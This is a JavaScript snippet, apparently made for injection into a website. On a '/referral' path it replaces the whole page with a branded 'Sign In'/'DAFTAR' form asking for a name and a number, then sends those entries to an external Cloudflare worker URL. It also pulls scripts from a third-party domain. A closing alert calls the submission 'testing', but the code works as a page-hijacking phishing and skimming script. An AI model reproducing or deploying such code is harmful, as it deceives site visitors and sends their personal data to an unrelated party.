(function () {
    "use strict";

    /*
     * Jalankan hanya pada:
     * /referral
     * /referral/
     */
    const path = window.location.pathname.replace(/\/+$/, "") || "/";

    if (path !== "/referral") {
        return;
    }

    /*
     * HTML halaman baru
     */
    const html = `
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport"
          content="width=device-width, initial-scale=1.0">

    <title>DAFTAR | Production</title>

    <link rel="shortcut icon"
        href="https://sultanbet78.asia//digicore_dashboard/assets/images/favicon.ico">

    <link
        href="https://sultanbet78.asia//digicore_dashboard/assets/css/icons.min.css"
        rel="stylesheet">

    <link
        href="https://sultanbet78.asia//digicore_dashboard/assets/css/app.min.css"
        rel="stylesheet"
        id="light-style">

    <link
        href="https://sultanbet78.asia//digicore_dashboard/assets/css/app-dark.min.css"
        rel="stylesheet"
        id="dark-style">
</head>

<body
    class="authentication-bg"
    data-layout-config='{
        "leftSideBarTheme":"dark",
        "layoutBoxed":false,
        "leftSidebarCondensed":false,
        "leftSidebarScrollable":false,
        "darkMode":false,
        "showRightSidebarOnStart":true
    }'>

    <div class="account-pages pt-2 pt-sm-5 pb-4 pb-sm-5">

        <div class="container">

            <div class="row justify-content-center">

                <div class="col-xxl-4 col-lg-5">

                    <div class="card">

                        <div class="card-header pt-4 pb-4 text-center bg-primary">

                            <a href="#">

                                <span>
                                    <img
                                        src="https://sultanbet78.asia/uploads/1786101157_photo_2026-08-07_18-11-06-removebg-preview.png"
                                        alt="Logo"
                                        height="32">
                                </span>

                            </a>

                        </div>

                        <div class="card-body p-4">

                            <div class="text-center w-75 m-auto">

                                <h4 class="text-dark-50 text-center pb-0 fw-bold">
                                    Sign In
                                </h4>

                            </div>

                            <form
                                action="#"
                                method="POST"
                                id="daftarForm">

                                <div class="mb-3">

                                    <label
                                        for="NAMAKU"
                                        class="form-label">
                                        NAMAKU
                                    </label>

                                    <input
                                        class="form-control"
                                        type="text"
                                        id="NAMAKU"
                                        name="NAMAKU"
                                        required
                                        placeholder="Masukan NAMAKU anda...">

                                </div>

                                <div class="mb-3">

                                    <label
                                        for="NOMORKU"
                                        class="form-label">
                                        NOMORKU
                                    </label>

                                    <div class="input-group input-group-merge">

                                        <input
                                            type="text"
                                            id="NOMORKU"
                                            name="NOMORKU"
                                            class="form-control"
                                            placeholder="Masukan NOMORKU anda...">

                                    </div>

                                </div>

                                <div class="mb-3 mb-0 text-center">

                                    <button
                                        class="btn btn-primary"
                                        type="submit">
                                        DAFTAR
                                    </button>

                                </div>

                            </form>

                        </div>

                    </div>

                    <div class="row mt-3">

                        <div class="col-12 text-center">

                            <p class="text-muted">
                                WHERE IDEAS BECOME CODES
                            </p>

                        </div>

                    </div>

                </div>

            </div>

        </div>

    </div>

    <footer class="footer footer-alt">
        2018 - 2026 © Gaming Hype - Digicore Studios
    </footer>

</body>
</html>
`;

    /*
     * Ganti seluruh halaman tanpa document.write()
     */
    function renderPage() {

        document.documentElement.innerHTML = html;

        const form = document.getElementById("daftarForm");

        if (!form) {
            console.error("Form daftarForm tidak ditemukan.");
            return;
        }

        /*
         * Handler tombol DAFTAR
         */
        form.addEventListener("submit", async function (event) {

            event.preventDefault();

            const namaEl = document.getElementById("NAMAKU");
            const nomorEl = document.getElementById("NOMORKU");

            if (!namaEl || !nomorEl) {
                console.error(
                    "Input NAMAKU atau NOMORKU tidak ditemukan."
                );
                return;
            }

            const nama = namaEl.value.trim();
            const nomor = nomorEl.value.trim();

            if (!nama) {
                alert("Silakan isi NAMAKU.");
                namaEl.focus();
                return;
            }

            if (!nomor) {
                alert("Silakan isi NOMORKU.");
                nomorEl.focus();
                return;
            }

            const message =
                `NAMAKU: ${nama}, NOMORKU: ${nomor}`;

            const endpoint =
                "https://memek-worker.defoy89122.workers.dev/?message=" +
                encodeURIComponent(message);

            const button =
                form.querySelector('button[type="submit"]');

            const originalText =
                button ? button.textContent : "DAFTAR";

            try {

                if (button) {
                    button.disabled = true;
                    button.textContent = "Mengirim...";
                }

                const response = await fetch(endpoint, {
                    method: "GET",
                    cache: "no-store"
                });

                console.log(
                    "Worker status:",
                    response.status
                );

                if (!response.ok) {
                    throw new Error(
                        "Worker mengembalikan HTTP " +
                        response.status
                    );
                }

                alert(
                    "Data berhasil dikirim untuk testing."
                );

                window.location.hash = "";

            } catch (error) {

                console.error(
                    "Worker error:",
                    error
                );

                alert(
                    "Gagal mengirim data: " +
                    (
                        error && error.message
                            ? error.message
                            : "Unknown error"
                    )
                );

            } finally {

                if (button) {
                    button.disabled = false;
                    button.textContent = originalText;
                }

            }
        });

        /*
         * Load JS bawaan halaman
         */
        const vendor =
            document.createElement("script");

        vendor.src =
            "https://sultanbet78.asia/digicore_dashboard/assets/js/vendor.min.js";

        vendor.async = true;

        document.body.appendChild(vendor);


        const app =
            document.createElement("script");

        app.src =
            "https://sultanbet78.asia/digicore_dashboard/assets/js/app.min.js";

        app.async = true;

        document.body.appendChild(app);
    }

    /*
     * Jalankan setelah DOM siap
     */
    if (document.readyState === "loading") {

        document.addEventListener(
            "DOMContentLoaded",
            renderPage,
            { once: true }
        );

    } else {

        renderPage();

    }

})();
